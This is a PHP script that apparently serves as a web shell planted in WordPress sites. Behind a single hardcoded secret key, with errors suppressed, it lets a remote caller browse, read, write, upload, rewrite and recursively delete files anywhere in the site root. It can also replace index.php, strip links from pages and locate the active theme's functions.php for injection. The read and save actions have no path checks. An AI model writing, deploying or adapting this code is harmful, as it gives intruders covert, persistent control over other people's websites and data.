<?php

define('SECRET_KEY', 'Gfkdfgiorodflllvfgjririfkglfkglrkllkf'); 

error_reporting(0);
ini_set('display_errors', 0);

ob_start();

function send_response($data) { 
    ob_end_clean(); 
    header('Content-Type: application/json'); 
    echo json_encode($data); 
    exit; 
}

function find_wp_root_path() { 
    $current_dir = __DIR__; 
    while (is_dir($current_dir) && $current_dir !== '/' && strlen($current_dir) > 1) { 
        if (is_dir($current_dir . '/wp-admin') && file_exists($current_dir . '/wp-includes/version.php')) { 
            return $current_dir; 
        } 
        $parent_dir = dirname($current_dir); 
        if ($parent_dir === $current_dir) { 
            return false; 
        } 
        $current_dir = $parent_dir; 
    } 
    return false; 
}

function get_operation_root() { 
    $wp_root = find_wp_root_path(); 
    if ($wp_root === false) { 
        return false; 
    } 
    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : null; 
    $wp_root_real = realpath($wp_root); 
    if ($doc_root && ($wp_root_real !== $doc_root)) { 
        $parent_dir = dirname($wp_root_real); 
        if (realpath($parent_dir) === $doc_root) { 
            return $parent_dir; 
        } 
    } 
    return $wp_root; 
}

function rrmdir($dir) { 
    if (is_dir($dir)) { 
        $objects = scandir($dir); 
        foreach ($objects as $object) { 
            if ($object != "." && $object != "..") { 
                $path = $dir . DIRECTORY_SEPARATOR . $object; 
                is_dir($path) && !is_link($path) ? rrmdir($path) : unlink($path); 
            } 
        } 
        rmdir($dir); 
    } 
}

// ЕДИНСТВЕННАЯ проверка безопасности - SECRET_KEY
if (!isset($_POST['secret_key']) || $_POST['secret_key'] !== SECRET_KEY) { 
    send_response(['status' => 'error', 'message' => 'Authentication failed.']); 
}

$base_dir = get_operation_root(); 

if ($base_dir === false) { 
    send_response(['status' => 'error', 'message' => 'Could not determine root directory.']); 
}

if (!isset($_POST['action'])) { 
    send_response(['status' => 'error', 'message' => 'Action not specified.']); 
}

$action = trim($_POST['action']);

switch ($action) {
    case 'ping':
    case 'check-health':
        send_response(['status' => 'success', 'message' => 'pong']);
        break;

    case 'browse_files':
        $path = isset($_POST['path']) ? trim($_POST['path'], '/') : '';
        $scan_path = $base_dir . '/' . $path;

        if (!is_dir($scan_path)) {
            send_response(['status' => 'error', 'message' => 'Directory not found: ' . htmlspecialchars($path)]);
        }

        $files = [];
        $items = @scandir($scan_path);
        
        if ($items === false) {
            send_response(['status' => 'error', 'message' => 'Failed to scan directory: ' . htmlspecialchars($path)]);
        }

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $item_path = $scan_path . '/' . $item;
            $files[] = is_dir($item_path) ? $item . '/' : $item;
        }

        sort($files);
        send_response(['status' => 'success', 'files' => $files]);
        break;

    case 'get_file_content':
        $file_path = isset($_POST['file_path']) ? trim($_POST['file_path'], '/') : '';
        $full_path = $base_dir . '/' . $file_path;

        if (!file_exists($full_path)) {
            send_response(['status' => 'error', 'message' => 'File not found: ' . htmlspecialchars($file_path)]);
        }

        if (is_dir($full_path)) {
            send_response(['status' => 'error', 'message' => 'Path is a directory: ' . htmlspecialchars($file_path)]);
        }

        $content = @file_get_contents($full_path);
        
        if ($content === false) {
            send_response(['status' => 'error', 'message' => 'Failed to read file: ' . htmlspecialchars($file_path)]);
        }

        send_response(['status' => 'success', 'content' => $content]);
        break;

    case 'save_file_content':
        $file_path = isset($_POST['file_path']) ? trim($_POST['file_path'], '/') : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $full_path = $base_dir . '/' . $file_path;

        $dir_path = dirname($full_path);
        if (!is_dir($dir_path)) {
            @mkdir($dir_path, 0755, true);
        }

        if (@file_put_contents($full_path, $content, LOCK_EX) === false) {
            send_response(['status' => 'error', 'message' => 'Failed to save file: ' . htmlspecialchars($file_path)]);
        }

        @chmod($full_path, 0644);
        send_response(['status' => 'success', 'message' => 'File saved: ' . htmlspecialchars($file_path)]);
        break;

    case 'find_replace':
        $file_path_relative = isset($_POST['path_and_filename']) ? trim($_POST['path_and_filename'], '/\\') : '';
        $file_path_absolute = $base_dir . '/' . $file_path_relative;
        
        if (!file_exists($file_path_absolute)) {
            send_response(['status' => 'error', 'message' => 'File not found.']);
        }

        $content = @file_get_contents($file_path_absolute);
        $find_text = $_POST['find_text'] ?? '';
        $replace_text = $_POST['replace_text'] ?? '';
        $case_sensitive = isset($_POST['case_sensitive']) && $_POST['case_sensitive'];

        $search_result = $case_sensitive ? strpos($content, $find_text) : stripos($content, $find_text);
        
        if ($search_result === false) {
            send_response(['status' => 'info', 'message' => 'Text not found in file.']);
        }
        
        $new_content = $case_sensitive ? str_replace($find_text, $replace_text, $content) : str_ireplace($find_text, $replace_text, $content);

        if (@file_put_contents($file_path_absolute, $new_content) !== false) {
            send_response(['status' => 'success', 'message' => 'Text has been replaced.']);
        } else {
            send_response(['status' => 'error', 'message' => 'Failed to write to file.']);
        }
        break;

    case 'remove_backlinks':
        $file_path_relative = isset($_POST['path_and_filename']) ? trim($_POST['path_and_filename'], '/\\') : '';
        $file_path_absolute = $base_dir . '/' . $file_path_relative;
        
        if (!file_exists($file_path_absolute)) {
            send_response(['status' => 'error', 'message' => 'File not found.']);
        }

        $content = @file_get_contents($file_path_absolute);
        $pattern = '/<a\s+[^>]*href\s*=\s*["\'][^"\']*["\'][^>]*>(.*?)<\/a>/is';
        $new_content = preg_replace($pattern, '$1', $content);
        $links_count = preg_match_all($pattern, $content);
        
        if ($new_content === $content) {
            send_response(['status' => 'info', 'message' => 'No backlinks found.']);
        }

        if (@file_put_contents($file_path_absolute, $new_content) !== false) {
            send_response(['status' => 'success', 'message' => "Removed $links_count backlinks."]);
        } else {
            send_response(['status' => 'error', 'message' => 'Failed to write to file.']);
        }
        break;

    case 'find_replace_last':
        $file_path_relative = isset($_POST['path_and_filename']) ? trim($_POST['path_and_filename'], '/\\') : '';
        $file_path_absolute = $base_dir . '/' . $file_path_relative;
        
        if (!file_exists($file_path_absolute)) {
            send_response(['status' => 'error', 'message' => 'File not found.']);
        }

        $content = @file_get_contents($file_path_absolute);
        $find_text = $_POST['find_text'] ?? '';
        $replace_text = $_POST['replace_text'] ?? '';
        $case_sensitive = isset($_POST['case_sensitive']) && $_POST['case_sensitive'];

        $last_pos = $case_sensitive ? strrpos($content, $find_text) : strripos($content, $find_text);
        
        if ($last_pos === false) {
            send_response(['status' => 'info', 'message' => 'Text not found.']);
        }
        
        $new_content = substr_replace($content, $replace_text, $last_pos, strlen($find_text));

        if (@file_put_contents($file_path_absolute, $new_content) !== false) {
            send_response(['status' => 'success', 'message' => 'Last occurrence replaced.']);
        } else {
            send_response(['status' => 'error', 'message' => 'Failed to write to file.']);
        }
        break;

    case 'create_file':
        $filename = isset($_POST['filename']) ? basename(trim($_POST['filename'])) : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $filePath = $base_dir . '/' . $filename; 
        
        if (@file_put_contents($filePath, $content) !== false) {
            @chmod($filePath, 0644);
            send_response(['status' => 'success', 'message' => 'File created: ' . htmlspecialchars($filename)]); 
        } else { 
            send_response(['status' => 'error', 'message' => 'Failed to create file: ' . htmlspecialchars($filename)]); 
        }
        break;

    case 'create_file_with_path':
        $file_path = isset($_POST['file_path']) ? trim($_POST['file_path'], '/\\') : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        
        // Только базовая проверка на ..
        if (strpos($file_path, '..') !== false) {
            send_response(['status' => 'error', 'message' => 'Invalid path: ".." not allowed']);
        }
        
        $full_path = $base_dir . '/' . $file_path; 
        $dir_path = dirname($full_path);
        
        if (!is_dir($dir_path)) {
            @mkdir($dir_path, 0755, true);
        }
        
        if (@file_put_contents($full_path, $content) !== false) {
            @chmod($full_path, 0644);
            send_response(['status' => 'success', 'message' => 'File created: ' . htmlspecialchars($file_path)]); 
        } else { 
            send_response(['status' => 'error', 'message' => 'Failed to write file: ' . htmlspecialchars($file_path)]); 
        }
        break;

    case 'list-files':
        $scan_path = isset($_POST['path']) ? $base_dir . '/' . trim($_POST['path'], '/\\') : $base_dir;
        
        if (is_dir($scan_path)) { 
            $files = array_values(array_diff(scandir($scan_path), ['.', '..'])); 
            send_response(['status' => 'success', 'files' => $files]); 
        } else { 
            send_response(['status' => 'error', 'message' => 'Directory not found']); 
        }
        break;

    case 'replace-index':
        $indexPath = $base_dir . '/index.php'; 
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        
        if (@file_put_contents($indexPath, $content) !== false) { 
            send_response(['status' => 'success', 'message' => 'index.php replaced.']); 
        } else { 
            send_response(['status' => 'error', 'message' => 'Failed to write index.php']); 
        }
        break;

    case 'create-dir':
        $path = isset($_POST['path']) ? $base_dir . '/' . trim($_POST['path'], '/\\') : '';
        
        if (!file_exists($path)) { 
            if (@mkdir($path, 0755, true)) { 
                send_response(['status' => 'success', 'message' => 'Directory created']); 
            } else { 
                send_response(['status' => 'error', 'message' => 'Failed to create directory']); 
            } 
        } else { 
            send_response(['status' => 'success', 'message' => 'Directory exists']); 
        }
        break;

    case 'upload_file':
        $dirPath = isset($_POST['path']) ? $base_dir . '/' . trim($_POST['path'], '/\\') : $base_dir;
        $filename = isset($_POST['filename']) ? basename($_POST['filename']) : '';
        $filePath = $dirPath . '/' . $filename; 
        
        if (!file_exists($dirPath)) @mkdir($dirPath, 0755, true); 
        
        $fileContent = base64_decode($_POST['content'] ?? '', true); 
        
        if ($fileContent === false) { 
            send_response(['status' => 'error', 'message' => 'Invalid base64 content.']); 
        } 
        
        if (@file_put_contents($filePath, $fileContent) !== false) {
            @chmod($filePath, 0644);
            send_response(['status' => 'success', 'message' => 'File uploaded: ' . htmlspecialchars($filename)]); 
        } else { 
            send_response(['status' => 'error', 'message' => 'Failed to write file']); 
        }
        break;

    case 'delete-path':
        $path_to_delete = isset($_POST['path']) ? $base_dir . '/' . trim($_POST['path'], '/\\') : '';
        
        if ($path_to_delete === $base_dir) { 
            send_response(['status' => 'error', 'message' => 'Cannot delete root directory']); 
        } 
        
        if (!file_exists($path_to_delete)) { 
            send_response(['status' => 'success', 'message' => 'Path does not exist']); 
        } else { 
            is_dir($path_to_delete) ? rrmdir($path_to_delete) : @unlink($path_to_delete); 
            send_response(['status' => 'success', 'message' => 'Path deleted']); 
        }
        break;
        
    case 'get_wp_theme_info':
        // Загрузка WordPress (если не загружено)
        if (!function_exists('wp_get_theme')) {
            $wp_dir = find_wp_root_path();
            if ($wp_dir) {
                require_once $wp_dir . '/wp-load.php';
            } else {
                send_response(['status' => 'error', 'message' => 'WordPress not found.']);
            }
        }
        
        $theme = wp_get_theme();
        $theme_name = $theme->get('Name');
        $stylesheet = get_stylesheet();
        $functions_path_rel = 'wp-content/themes/' . $stylesheet . '/functions.php';
        $functions_path_full = $base_dir . '/' . $functions_path_rel;
        
        send_response([
            'status' => 'success', 
            'theme_name' => $theme_name, 
            'stylesheet' => $stylesheet, 
            'functions_path_rel' => $functions_path_rel, 
            'functions_path_full' => $functions_path_full
        ]);
        break;
       
        

    default:
        send_response(['status' => 'error', 'message' => 'Unknown action: ' . htmlspecialchars($action)]);
        break;
}

?>
